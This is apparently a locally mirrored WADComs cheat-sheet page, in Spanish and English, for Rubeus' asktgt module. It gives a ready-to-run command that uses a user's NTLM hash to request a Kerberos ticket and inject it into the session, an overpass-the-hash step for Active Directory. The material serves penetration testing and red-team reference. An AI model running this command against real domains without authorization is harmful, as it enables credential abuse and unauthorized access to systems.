# WADComs: Rubeus-AskTGT

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Hash`, `Username`

**Sistema:** `Windows`

## Descripción

Rubeus' `asktgt` module uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.

Command Reference:

	Domain: test.local

	Username: john

	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7

## Comando

```bash
Rubeus.exe asktgt /domain:test.local /user:john /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
```

## Referencias

- https://github.com/GhostPack/Rubeus
- https://github.com/GhostPack/Rubeus#asktgt
